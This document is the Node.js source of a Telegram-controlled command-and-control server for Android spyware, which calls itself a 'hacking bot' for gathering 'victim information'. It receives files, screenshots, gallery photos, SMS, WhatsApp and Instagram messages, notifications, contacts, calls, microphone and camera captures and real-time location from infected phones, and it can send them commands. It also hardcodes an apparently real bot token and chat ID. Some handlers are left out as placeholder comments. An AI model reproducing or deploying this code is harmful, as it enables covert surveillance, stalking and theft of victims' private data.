const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token ='8458876632:AAFYa27fG7rnAiH6BBSKOkmpviWcQbmFSO4'
const id = '6576599231'
const address = 'https://www.youtube.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

// Existing endpoints
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})

// New endpoints for additional features
app.post("/uploadScreenshot", upload.single('image'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `°• 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    })
    res.send('')
})

app.post("/uploadGalleryImage", upload.single('image'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `°• 𝙂𝙖𝙡𝙡𝙚𝙧𝙮 𝙄𝙢𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n📁 ${req.headers.path || ''}`,
        parse_mode: "HTML"
    })
    res.send('')
})

app.post("/uploadNotification", (req, res) => {
    const notification = req.body;
    appBot.sendMessage(id, 
        `°• 𝙉𝙚𝙬 𝙉𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n` +
        `📱 𝘼𝙥𝙥: <b>${notification.app || 'Unknown'}</b>\n` +
        `📝 𝙏𝙞𝙩𝙡𝙚: <b>${notification.title || 'No Title'}</b>\n` +
        `💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚: ${notification.text || 'No Text'}\n` +
        `⏰ 𝙏𝙞𝙢𝙚: ${notification.time || new Date().toLocaleString()}`,
        {parse_mode: "HTML"}
    )
    res.send('')
})

app.post("/uploadSocialMessage", (req, res) => {
    const message = req.body;
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${message.app || 'Unknown App'}</b>\n\n` +
        `👤 𝙁𝙧𝙤𝙢: <b>${message.sender || 'Unknown'}</b>\n` +
        `💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚: ${message.text || 'No Text'}\n` +
        `⏰ 𝙏𝙞𝙢𝙚: ${message.time || new Date().toLocaleString()}`,
        {parse_mode: "HTML"}
    )
    res.send('')
})

app.post("/uploadRealtimeLocation", (req, res) => {
    const location = req.body;
    appBot.sendLocation(id, location.lat, location.lon);
    appBot.sendMessage(id,
        `°• 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙐𝙥𝙙𝙖𝙩𝙚\n\n` +
        `📱 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${req.headers.model}</b>\n` +
        `📍 𝙇𝙖𝙩: ${location.lat}\n` +
        `📍 𝙇𝙤𝙣: ${location.lon}\n` +
        `⏰ 𝙏𝙞𝙢𝙚: ${new Date().toLocaleString()}`,
        {parse_mode: "HTML"}
    )
    res.send('')
})

// WebSocket connection handling
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        realtimeLocation: false,
        liveNotifications: false
    })
    
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )

    ws.on('message', function(message) {
        try {
            const data = JSON.parse(message);
            if (data.type === 'realtime_location') {
                appBot.sendLocation(id, data.lat, data.lon);
                appBot.sendMessage(id,
                    `°• 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣\n\n` +
                    `📱 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b>\n` +
                    `📍 𝙇𝙖𝙩: ${data.lat}\n` +
                    `📍 𝙇𝙤𝙣: ${data.lon}`,
                    {parse_mode: "HTML"}
                )
            } else if (data.type === 'live_notification') {
                appBot.sendMessage(id,
                    `°• 𝙇𝙞𝙫𝙚 𝙉𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n` +
                    `📱 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b>\n` +
                    `📱 𝘼𝙥𝙥: <b>${data.app}</b>\n` +
                    `📝 𝙏𝙞𝙩𝙡𝙚: <b>${data.title}</b>\n` +
                    `💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚: ${data.text}\n` +
                    `⏰ 𝙏𝙞𝙢𝙚: ${data.time}`,
                    {parse_mode: "HTML"}
                )
            }
        } catch (e) {
            // Not JSON, handle as string command
        }
    })

    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴚᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

// Bot message handling
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    // Existing reply handling
    if (message.reply_to_message) {
        // ... [existing reply handlers remain the same]
        // Add new reply handlers for new features
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙛𝙤𝙧 𝙧𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙪𝙥𝙙𝙖𝙩𝙚𝙨')) {
            const interval = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`realtime_location:${interval}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙩𝙧𝙖𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙖𝙧𝙩𝙚𝙙\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ʟᴏᴄᴀᴛɪᴏɴ ᴜᴘᴅᴀᴛᴇꜱ ᴇᴠᴇʀʏ ' + interval + ' ꜱᴇᴄᴏɴᴅꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙃𝙚𝙡𝙡𝙤, 𝙢𝙮 𝘿𝙚𝙖𝙧 @Techno_Beats\n\n' +
                '• ʜᴇʏ ᴛʜᴇʀᴇ! ɪ ᴀᴍ ᴛʜᴇ ʜᴀᴄᴋɪɴɢ ʙᴏᴛ. ɪ ᴀᴍ ᴀ ʙᴏᴛ ᴛʜᴀᴛ ᴄᴀɴ ʜᴇʟᴘ ʏᴏᴜ ᴡɪᴛʜ ᴀʟʟ ʏᴏᴜʀ ʜᴀᴄᴋɪɴɢ ɴᴇᴇᴅꜱ.\n\n' +
                '• ɪ ᴄᴀɴ ʜᴇʟᴘ ʏᴏᴜ ғɪɴᴅ ᴠɪᴄᴛɪᴍ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴏɴ ᴛʜɪꜱ ʜᴀᴄᴋɪɴɢ ʙᴏᴛ.\n\n' +
                '• ɪ ᴄᴀɴ ᴀʟꜱᴏ ʜᴇʟᴘ ʏᴏᴜ ᴛᴏ ɢᴀᴛʜᴇʀ ᴠɪᴄᴛɪᴍ ɪɴғᴏʀᴍᴀᴛɪᴏɴ, ꜱᴜᴄʜ ᴀꜱ ᴠɪᴄᴛɪᴍ ᴅᴇᴠɪᴄᴇ ᴀʟʟ ᴀᴄᴄᴇꜱꜱ ɪɴ ᴛʜɪꜱ ʙᴏᴛ.\n\n' +
                '• ᴛʜɪꜱ ʙᴏᴛ ᴡᴀꜱ ᴍᴀᴅᴇ ʙʏ @Techno_Beats JOIN TELEGRAM',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})

// Bot callback query handling
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    // New features buttons
                    [
                        {text: '📸 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩', callback_data: `screenshot:${uuid}`},
                        {text: '🖼 𝙂𝙖𝙡𝙡𝙚𝙧𝙮', callback_data: `gallery:${uuid}`}
                    ],
                    [
                        {text: '🔔 𝙇𝙞𝙫𝙚 𝙉𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣𝙨', callback_data: `live_notifications:${uuid}`},
                        {text: '📍 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `realtime_location:${uuid}`}
                    ],
                    [
                        {text: '📱 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `whatsapp_messages:${uuid}`},
                        {text: '📸 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `instagram_messages:${uuid}`}
                    ],
                    [
                        {text: '📨 𝘼𝙡𝙡 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `all_messages:${uuid}`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }
    
    // Existing command handlers remain the same...
    // Add new command handlers for new features
    
    if (commend == 'screenshot') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('screenshot');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'gallery') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('gallery');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙂𝙖𝙡𝙡𝙚𝙧𝙮 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ɪᴍᴀɢᴇꜱ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'live_notifications') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('live_notifications');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙇𝙞𝙫𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣𝙨 𝙖𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ɴᴏᴡ ʀᴇᴄᴇɪᴠᴇ ᴀʟʟ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴꜱ ɪɴ ʀᴇᴀʟ-ᴛɪᴍᴇ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'realtime_location') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙛𝙤𝙧 𝙧𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙪𝙥𝙙𝙖𝙩𝙚𝙨\n\n' +
            '• ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ (ᴇ.ɢ., 30 ꜰᴏʀ ᴇᴠᴇʀʏ 30 ꜱᴇᴄᴏɴᴅꜱ)',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    
    if (commend == 'whatsapp_messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('whatsapp_messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ᴍᴇꜱꜱᴀɢᴇꜱ ɪɴ ʀᴇᴀʟ-ᴛɪᴍᴇ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'instagram_messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('instagram_messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ɪɴꜱᴛᴀɢʀᴀᴍ ᴍᴇꜱꜱᴀɢᴇꜱ ɪɴ ʀᴇᴀʟ-ᴛɪᴍᴇ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'all_messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('all_messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝘼𝙡𝙡 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀʟʟ ᴍᴇꜱꜱᴀɢᴇꜱ (ꜱᴍꜱ, ᴡʜᴀᴛꜱᴀᴘᴘ, ɪɴꜱᴛᴀɢʀᴀᴍ) ɪɴ ʀᴇᴀʟ-ᴛɪᴍᴇ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    // ... [rest of existing callback handlers remain the same]
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

appServer.listen(process.env.PORT || 22222);
